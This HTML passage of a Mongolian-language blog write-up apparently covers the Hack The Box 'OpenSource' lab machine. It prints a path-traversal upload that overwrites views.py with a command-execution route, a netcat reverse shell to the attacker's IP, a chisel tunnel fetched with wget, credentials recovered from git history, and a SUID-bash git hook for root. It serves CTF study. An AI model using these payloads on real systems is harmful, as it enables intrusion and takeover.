+</span></span><span style=display:flex><span>CMD <span style=color:#f92672>[</span><span style=color:#e6db74>&#34;/usr/bin/supervisord&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;/etc/supervisord.conf&#34;</span><span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>supervisord.conf</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>supervisord<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>user<span style=color:#f92672>=</span>root
+</span></span><span style=display:flex><span>nodaemon<span style=color:#f92672>=</span>true
+</span></span><span style=display:flex><span>logfile<span style=color:#f92672>=</span>/dev/null
+</span></span><span style=display:flex><span>logfile_maxbytes<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>pidfile<span style=color:#f92672>=</span>/run/supervisord.pid
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>program:flask<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>command<span style=color:#f92672>=</span>python /app/run.py
+</span></span><span style=display:flex><span>stdout_logfile<span style=color:#f92672>=</span>/dev/stdout
+</span></span><span style=display:flex><span>stdout_logfile_maxbytes<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>stderr_logfile<span style=color:#f92672>=</span>/dev/stderr
+</span></span><span style=display:flex><span>stderr_logfile_maxbytes<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>/app/run.py</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> app <span style=color:#f92672>import</span> app
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    port <span style=color:#f92672>=</span> int(os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;PORT&#34;</span>, <span style=color:#ae81ff>80</span>))
+</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span>port)
+</span></span></code></pre></div><p>utils.py</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>current_milli_time</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> round(time<span style=color:#f92672>.</span>time() <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Pass filename and return a secure version, which can then safely be stored on a regular file system.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_file_name</span>(unsafe_filename):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> recursive_replace(unsafe_filename, <span style=color:#e6db74>&#34;../&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>TODO: get unique filename
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_unique_upload_name</span>(unsafe_filename):
+</span></span><span style=display:flex><span>    spl <span style=color:#f92672>=</span> unsafe_filename<span style=color:#f92672>.</span>rsplit(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>.&#34;</span>, <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>    file_name <span style=color:#f92672>=</span> spl[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>    file_extension <span style=color:#f92672>=</span> spl[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> recursive_replace(file_name, <span style=color:#e6db74>&#34;../&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;_&#34;</span> <span style=color:#f92672>+</span> str(current_milli_time()) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>+</span> file_extension
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Recursively replace a pattern in a string
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>recursive_replace</span>(search, replace_me, with_me):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> replace_me <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> search:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> search
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> recursive_replace(search<span style=color:#f92672>.</span>replace(replace_me, with_me), replace_me, with_me)
+</span></span></code></pre></div><h3 id=4-sourcezip>4. Source.zip<a hidden class=anchor aria-hidden=true href=#4-sourcezip>#</a></h3><p>views.py дээр нэмээд /upcloud руу хуулаад burp-с шалгана.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/exec&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>cmd</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> os<span style=color:#f92672>.</span>system(request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;cmd&#39;</span>))
+</span></span></code></pre></div><h3 id=5-git-extract>5.  .git Extract<a hidden class=anchor aria-hidden=true href=#5-git-extract>#</a></h3><p>Gittools - ашиглаж extractor задлан харвал 0~4 хооронд commit байгаа. git diff-р шалган харвал энэ коммит дээр creds олдоно:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git diff a76f8f75f7a4a12b706b0cf9c983796fa1985820
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>index 76c7768..5b0553c <span style=color:#ae81ff>100644</span>
+</span></span><span style=display:flex><span>--- a/Dockerfile
+</span></span><span style=display:flex><span>+++ b/Dockerfile
+</span></span><span style=display:flex><span>@@ -29,7 +29,6 @@ ENV PYTHONDONTWRITEBYTECODE<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> <span style=color:#75715e># Set mode</span>
+</span></span><span style=display:flex><span> ENV MODE<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PRODUCTION&#34;</span>
+</span></span><span style=display:flex><span>-# ENV FLASK_DEBUG<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> <span style=color:#75715e># Run supervisord</span>
+</span></span><span style=display:flex><span> CMD <span style=color:#f92672>[</span><span style=color:#e6db74>&#34;/usr/bin/supervisord&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;/etc/supervisord.conf&#34;</span><span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
+</span></span><span style=display:flex><span>deleted file mode <span style=color:#ae81ff>100644</span>
+</span></span><span style=display:flex><span>index 5975e3f..0000000
+</span></span><span style=display:flex><span>--- a/app/.vscode/settings.json
+</span></span><span style=display:flex><span>+++ /dev/null
+</span></span><span style=display:flex><span>@@ -1,5 +0,0 @@
+</span></span><span style=display:flex><span>-<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>-  <span style=color:#e6db74>&#34;python.pythonPath&#34;</span>: <span style=color:#e6db74>&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span>,
+</span></span><span style=display:flex><span>-  <span style=color:#e6db74>&#34;http.proxy&#34;</span>: <span style=color:#e6db74>&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span>,
+</span></span><span style=display:flex><span>-  <span style=color:#e6db74>&#34;http.proxyStrictSSL&#34;</span>: false
+</span></span><span style=display:flex><span>-<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>diff --git a/app/app/views.py b/app/app/views.py
+</span></span><span style=display:flex><span>index 0f3cc37..d46763c <span style=color:#ae81ff>100644</span>
+</span></span><span style=display:flex><span>--- a/app/app/views.py
+</span></span><span style=display:flex><span>+++ b/app/app/views.py
+</span></span><span style=display:flex><span>@@ -6,17 +6,7 @@ from flask import render_template, request, send_file
+</span></span><span style=display:flex><span> from app import app
+</span></span></code></pre></div><p>`http://dev01:Soulless_<a href=mailto:Developer#2022@10.10.10.128>Developer#2022@10.10.10.128</a>:5187/</p><h3 id=6-burp>6. Burp<a hidden class=anchor aria-hidden=true href=#6-burp>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /upcloud HTTP/1.1
+</span></span><span style=display:flex><span>Host: 10.10.11.164
+</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
+</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
+</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
+</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
+</span></span><span style=display:flex><span>Content-Type: multipart/form-data; boundary<span style=color:#f92672>=</span>---------------------------351476346536780354041826391575
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>1013</span>
+</span></span><span style=display:flex><span>Origin: http://10.10.11.164
+</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Connection: close
+</span></span><span style=display:flex><span>Referer: http://10.10.11.164/upcloud
+</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------------------351476346536780354041826391575
+</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;views.py&#34;</span>
+</span></span><span style=display:flex><span>Content-Type: text/x-python
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>from app.utils import get_file_name
+</span></span><span style=display:flex><span>from flask import render_template, request, send_file
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>from app import app
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@app.route<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/&#39;</span>, methods<span style=color:#f92672>=[</span><span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>def upload_file<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request.method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
+</span></span><span style=display:flex><span>        f <span style=color:#f92672>=</span> request.files<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;file&#39;</span><span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>        file_name <span style=color:#f92672>=</span> get_file_name<span style=color:#f92672>(</span>f.filename<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>        file_path <span style=color:#f92672>=</span> os.path.join<span style=color:#f92672>(</span>os.getcwd<span style=color:#f92672>()</span>, <span style=color:#e6db74>&#34;public&#34;</span>, <span style=color:#e6db74>&#34;uploads&#34;</span>, file_name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>        f.save<span style=color:#f92672>(</span>file_path<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;success.html&#39;</span>, file_url<span style=color:#f92672>=</span>request.host_url + <span style=color:#e6db74>&#34;uploads/&#34;</span> + file_name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;upload.html&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@app.route<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/uploads/&lt;path:path&gt;&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>def send_report<span style=color:#f92672>(</span>path<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    path <span style=color:#f92672>=</span> get_file_name<span style=color:#f92672>(</span>path<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> send_file<span style=color:#f92672>(</span>os.path.join<span style=color:#f92672>(</span>os.getcwd<span style=color:#f92672>()</span>, <span style=color:#e6db74>&#34;public&#34;</span>, <span style=color:#e6db74>&#34;uploads&#34;</span>, path<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>@app.route<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/exec&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>def cmd<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> os.system<span style=color:#f92672>(</span>request.args.get<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;cmd&#39;</span><span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------------------351476346536780354041826391575--
+</span></span></code></pre></div><p>Repeater -руу оруулаад
+Content-Disposition:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;..//app/app/views.py&#34;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.54 <span style=color:#ae81ff>9001</span> &gt;/tmp/f
+</span></span></code></pre></div><p>CyperChef <code>URL Encoded</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E54%209001%20%3E%2Ftmp%2Ff
+</span></span></code></pre></div><p>Reverse Shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
+</span></span></code></pre></div><p>burp-с хүсэлт явуулах</p><pre tabindex=0><code>http://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E54%209001%20%3E%2Ftmp%2Ff
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>9001</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.54<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.11.164<span style=color:#f92672>]</span> <span style=color:#ae81ff>42719</span>
+</span></span><span style=display:flex><span>/bin/sh: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
+</span></span><span style=display:flex><span>/app <span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span>INSTALL.md
+</span></span><span style=display:flex><span>app
+</span></span><span style=display:flex><span>public
+</span></span><span style=display:flex><span>run.py
+</span></span><span style=display:flex><span>/app <span style=color:#75715e># id</span>
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1<span style=color:#f92672>(</span>bin<span style=color:#f92672>)</span>,2<span style=color:#f92672>(</span>daemon<span style=color:#f92672>)</span>,3<span style=color:#f92672>(</span>sys<span style=color:#f92672>)</span>,4<span style=color:#f92672>(</span>adm<span style=color:#f92672>)</span>,6<span style=color:#f92672>(</span>disk<span style=color:#f92672>)</span>,10<span style=color:#f92672>(</span>wheel<span style=color:#f92672>)</span>,11<span style=color:#f92672>(</span>floppy<span style=color:#f92672>)</span>,20<span style=color:#f92672>(</span>dialout<span style=color:#f92672>)</span>,26<span style=color:#f92672>(</span>tape<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>video<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>etc/hosts</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/ <span style=color:#75715e># cat etc/hosts</span>
+</span></span><span style=display:flex><span>127.0.0.1       localhost
+</span></span><span style=display:flex><span>::1     localhost ip6-localhost ip6-loopback
+</span></span><span style=display:flex><span>fe00::0 ip6-localnet
+</span></span><span style=display:flex><span>ff00::0 ip6-mcastprefix
+</span></span><span style=display:flex><span>ff02::1 ip6-allnodes
+</span></span><span style=display:flex><span>ff02::2 ip6-allrouters
+</span></span><span style=display:flex><span>172.17.0.8      72e163665cfd
+</span></span></code></pre></div><h3 id=7-chisel>7. Chisel<a hidden class=anchor aria-hidden=true href=#7-chisel>#</a></h3><p>Chisel</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>### Download</span>
+</span></span><span style=display:flex><span>chisel_1.7.7_linux_amd64.gz
+</span></span><span style=display:flex><span><span style=color:#75715e>## unzip</span>
+</span></span><span style=display:flex><span>gzip -d chisel_1.7.7_linux_amd64.gz
+</span></span><span style=display:flex><span>mv chisel_1.7.7_linux_amd64 chisel
+</span></span><span style=display:flex><span>chmod +x chisel
+</span></span><span style=display:flex><span><span style=color:#75715e>## curl to Machine VM</span>
+</span></span><span style=display:flex><span>wget http://10.10.14.54:8000/chisel
+</span></span><span style=display:flex><span>chmod +x chisel
+</span></span></code></pre></div><p>Local VM:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./chisel server --reverse --port <span style=color:#ae81ff>6969</span>
+</span></span></code></pre></div><p>Machine VM:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./chisel client 10.10.14.54:6969 R:socks
+</span></span></code></pre></div><figure><img loading=lazy src=/images/opensource_post_image_1.png></figure><p>proxychains & rustscan</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains rustscan 172.17.0.1 -u <span style=color:#ae81ff>5000</span>
+</span></span></code></pre></div><p>Нээлттэй портууд:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>20, 80, 3000
+</span></span></code></pre></div><p>Proxy тохиргоо<figure><img loading=lazy src=/images/opensource_post_image_2.png></figure></p><p>http://172.17.0.1:3000/ - socks5 -г асаагаад хандвал gitea байгаа. Sign-up & in хийгээд орвол:
+<a href=mailto:dev01@opensource.htb>dev01@opensource.htb</a>
+dev01
+нэртэй хэрэглэгч байгааг харах боломжтой. Gitrools-с авсан creds нэвтрэх</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>dev01@opensource.htb
+</span></span><span style=display:flex><span>Soulless_Developer#2022
+</span></span></code></pre></div><p>Нэвтрэн орвол home-backup repo дотор id_rsa байна.</p><pre tabindex=0><code>-----BEGIN RSA PRIVATE KEY-----
+MIIJKQIBA***********
+-----END RSA PRIVATE KEY-----
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> id_rsa
+</span></span><span style=display:flex><span>ssh -i id_rsa dev01@10.10.11.164
+</span></span></code></pre></div><p>user.txt</p><pre tabindex=0><code>dd75ed9*******
+</code></pre><h3 id=8-privilege-escalation>8. Privilege escalation<a hidden class=anchor aria-hidden=true href=#8-privilege-escalation>#</a></h3><p>gitea - backup хийдэг тэгээд
+.git/hooks/pre-commit.sample засаад</p><pre tabindex=0><code>chmod u+s /bin/bash
+</code></pre><p>нэмж оруулаад үндсэн нэрийг pre-commit болгон өөрчлөөд 2-5 мин хүлээнэ.</p><p>Root руу орохдоо:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/bin/bash -p
+</span></span></code></pre></div><p>root.txt</p><pre tabindex=0><code>f4f2397e**********
+</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=next href=https://cadil.github.io/posts/2024-03-11-htb-retired-writeup/><span class=title>Дараах »</span><br><span>HTB - Retired</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
